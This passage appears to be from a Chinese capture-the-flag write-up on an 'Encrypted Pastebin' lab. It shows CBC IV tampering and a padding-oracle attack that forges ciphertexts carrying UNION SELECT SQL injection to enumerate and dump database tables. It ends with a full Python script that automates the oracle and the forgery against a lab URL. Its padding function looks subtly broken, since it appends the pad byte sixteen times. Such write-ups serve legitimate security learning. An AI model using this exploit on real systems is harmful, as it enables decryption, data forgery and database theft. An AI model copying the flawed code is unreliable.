    post = 'LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~'
    data = decode(post)[16*(1+5):]    # 抛弃原始密文的前5个分组（加1是因为有16字节的IV）
    iv_6 = decode(post)[16*(1+4):16*(1+5)]    # 第5个分组的密文，也就是第6个分组的“IV”
    immediate = bxor(b'$FLAG$", "id": "', iv_6)    # 第6个分组密文解密的直接结果
    iv = bxor(immediate, b'{"id":"1", "i":"')    # 计算出合适的IV
    print(encode(iv+data))
运行该代码计算出对应`post`参数为：
    11is9FtK5stoIrb8SWs77z8UuS!4LYUxaWyX6xNAbZ97!foFZcv8sjHHgvhUJYLLWud0hjVTRwVZ8BNH1oi8PGIdpCjZOVLvSjlkiLWd2QU~
提交此参数，没有成功查询出`id`为`1`的条目，但成功拿到了新的flag，如下图。
通过错误提示推测这是因为服务器只加密了body没有加密title，flag存储在title中，尝试解密body时触发了错误（因为key是id=3的数据的，不是id=1的数据的），但好在错误信息中包含了title的值。
## Flag 4
继续设法触发新的报错，试试SQL注入。构造如下的明文，把`id`的值设置为单引号：
    {"id":"'", "i":"
    3", "key": "XjPk
    mljch5E2sMiNhsNi
    qg~~"}\n\n\n\n\n
    \n\n\n\n\n
计算出对应`post`为：
    11is9FtK5t1oIrb8SWs77z8UuS!4LYUxaWyX6xNAbZ97!foFZcv8sjHHgvhUJYLLWud0hjVTRwVZ8BNH1oi8PGIdpCjZOVLvSjlkiLWd2QU~
提交此参数，如愿以偿地看到了SQL注入的报错，甚至知道了具体的SQL语句是什么，如下图。
但按现有的方法，我们最多只能控制9个字符。9个字符是无论如何都无法完成注入的。
多方查阅资料后在一篇文章中看到说padding oracle攻击不仅可以用来解密明文，还可以用来构造解密出 **任意指定**
明文的密文。又在《[Automated Padding Oracle Attacks with
PadBuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)》中找到了具体的原理，其实非常简单，是我们前面做法的推广。这里简单叙述一下原理。
如上图，已知利用padding oracle攻击我们可以在不知道密钥的情况下解密出 **任意** 密文对应的`Intermediary
Value`，在CBC模式中`Intermediary Value`和IV或上一块密文异或得到`Decrypted
Value`。为构造解密出任意指定明文的密文，我们先将明文分组并按PKCS#5填充。然后随机生成16字节数据做最后一块密文，用padding
oracle计算出它的`Intermediary Value`，用`Intermediary
Value`异或最后一块明文得到倒数第二块密文。用padding oracle计算出倒数第二块密文的`Intermediary
Value`，用`Intermediary Value`异或倒数第二块明文得到倒数第三块密文。依此类推，直到计算出IV。
看懂原理后写了一个Python脚本来实现这种攻击，脚本太长为了不影响阅读附在文末。
首先构造明文：
    {"id":"0 UNION SELECT database(), ''","key":"XjPkmljch5E2sMiNhsNiqg~~"}
计算出对应`post`参数为：
    vpxsCHeQyFv5Xz4ITQHcTgNDCEuKQ1YRvZU6JINj2La063Cs2XWp0GsHLGVmrVFfrwmnx-gmZgdPBL16ODezPqd5DrohLnQvjeJK7!STgHyNFotCtLYeOCS2-IVdPQHA
得到数据库名为`level3`。
接着构造明文：
    {"id":"0 UNION SELECT group_concat(TABLE_NAME), '' from information_schema.tables where TABLE_SCHEMA='level3'","key":"XjPkmljch5E2sMiNhsNiqg~~"}
计算出对应`post`参数为：
    7yUXiAErbrYDMQu9o6!rEsLGp-qFoWKIc!n22RVLCUNmFRKq9OZtyTtyPOy3LNbMLyQJmYODUBikZMkFlGdYJ2bIzCAsMXWK8pZJ94T7HNGYCAnZbf6eb0vpocf-ybAo42WQc9dUv8Iw7!9WZe76ETDW!M7obDKpipW4WMM9l3TJPkw0pFrSNtOHB1XmaKv23hh51E8cGTaU-1P27YqZZY0Wi0K0th44JLb4hV09AcA~
得到数据库`level3`中有表`posts`和`tracking`，前一个表的内容我们已经知道了，所以关心后一个表，构造如下明文查询它有哪些列：
    {"id":"0 UNION SELECT group_concat(column_name), '' from information_schema.columns where TABLE_NAME='tracking'","key":"XjPkmljch5E2sMiNhsNiqg~~"}
计算出对应`post`参数为：
    xjYpoCshfUQiElru19HYf04qjeYVD8CoA9XmG2Oly9ECT7stCN-AuV5PqBw5FOTaMmYIYykBwq7wUHJ08kc6jjNgK8pwZ0-U3024MxjwrCgGJu3qOBz91H1qn5DT5zducioD06x1w3HClw2grzbdreZgLFq!JQJMk8VhhXweN65GVLlJwibidmS4SFd0XZYh7HVnylECByiK5U3o85SHe40Wi0K0th44JLb4hV09AcA~
得到表`tracking`有列`id`和`headers`，`id`里应该没有实际数据，所以我们试图查询出`headers`。为此构造明文：
    {"id":"0 UNION SELECT group_concat(headers), '' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"}
计算出对应`post`参数为：
    be6Lqymj1Mmo5urgkMavFVbMAhGyzY8DKY94bPMcjvq!wzT2jIXMFVg-5aEFeap-zVKyX8oHocYl4foLJe76ETDW!M7obDKpipW4WMM9l3TJPkw0pFrSNtOHB1XmaKv23hh51E8cGTaU-1P27YqZZY0Wi0K0th44JLb4hV09AcA~
成功的查出了所有的`headers`，但其中没有flag。观察数据，看到`headers`应该是http的头部，其中也包含`post`参数，都试一试，发现第一个`post`参数可以解出一个新的flag，如下图。
至此，拿到了全部的4个flag。
## 总结
先总结一下Encrypted
Pastebin的工作流程：每次接到用户数据都随机生成一个key对其进行加密，加密结果存储在数据库中，然后用固定密钥staticKey加密随机生成的key，并将加密结果和数据库条目id编码后返回给用户。用户直接打开链接就可以看到存储的数据，和非加密的Pastebin一样方便。加密用户数据的密钥确实没有存储在数据库中，和首页宣传的一致。
这道题目对我来说是很有难度的，我花了一整个周末才完成它。一方面它让我复习/新学了密码学知识，另一方面，也是更重要的——它教导我不要轻易放弃。在进行padding
oracle攻击时，速度很慢很慢，由于编程错误跑了很久却没有任何结果，让我心灰意冷，反复修改多次才终于成功。进行SQL注入时，由于一开始不知道利用padding
oracle攻击可以构造解密出任意指定明文的密文便毫无思路，并且已经拿到了27分，几乎真的放弃了。后来觉得若是现在放弃，今后再做又得复习前面的所有步骤，白白浪费时间，才又坚持做下去。
## 附录
生成解密出任意指定明文的密文的Python脚本：
    import base64
    import requests
    def trans(s):
        return "b'%s'" % ''.join('\\x%.2x' % x for x in s)
    def decode(data):
        return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))
    def encode(data):
        return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')
    def bxor(b1, b2): # use xor for bytes
        result = b""
        for b1, b2 in zip(b1, b2):
            result += bytes([b1 ^ b2])
        return result
    def test(url, data):
        r = requests.get(url+'?post={}'.format(data))
        if 'PaddingException' in r.text:
            return False
        else:
            print(r.url)
            return True
    def generate_iv_list(tail):
        iv = b'\x00' * (16 - len(tail) -1) 
        return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]
    def padding_oracle_decrypt(url, data):
        print('破解数据：{}'.format(data))
        index = 15
        intermediary = bytes()
        tail = bytes()
        while index >= 0:
            for iv in generate_iv_list(tail):
                print('尝试初始向量：{}'.format(trans(iv)))
                if test(url, encode(iv+data)):
                    intermediary = bytes([(16-index) ^ iv[index]]) + intermediary
                    index -= 1
                    tail = bytes([temp ^ (16-index) for temp in intermediary])
                    break
        return intermediary
    def pad(data, block_size):
        """按PKCS#5填充"""
        amount_to_pad = block_size - (len(data) % block_size)
        if amount_to_pad == 0:
            amount_to_pad = block_size
        pad = bytes([amount_to_pad])
        return data + pad * 16
    if __name__ == '__main__':
        url = 'http://35.190.155.168/fc2fd7e530/'
        post = 'OQ9EaI4kACeslNOW5XuTWpnKWmjyduYd0CnPDOFVUNW6tmnWyxyj-ID-xbYIkUaXrg-F4T!!5!4cZxh738rhQ-1QhYP1GcIy-tx0HILgW9bqTiWFGCgrCqTJKoLfoKlXjRaLQrS2HjgktviFXT0BwFPxx29x7i1UxDdLeC7ZAVxvJ4WDvDyxzEc3vNxuRE5UB!dytTf!iY32Cpl8iiI7LQ~~'
        ciphertext = decode(post)[16*6:16*7]
        immediate = bxor(b'$FLAG$", "id": "', decode(post)[16*(1+4):16*(1+5)])
        plains = '{"id":"0 UNION SELECT group_concat(headers), \'\' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"}'
        data = pad(plains.encode('utf-8'), 16)
        block_amount = int(len(data) / 16)
        index = block_amount
        while True:
            block = data[(index-1)*16: index*16]
            print('处理块：')
            print(block)
            iv = bxor(immediate, block)
            ciphertext = iv + ciphertext
            index -= 1
            if index > 0:
                immediate = padding_oracle_decrypt(url, iv)
            else:
                break
        print(encode(ciphertext))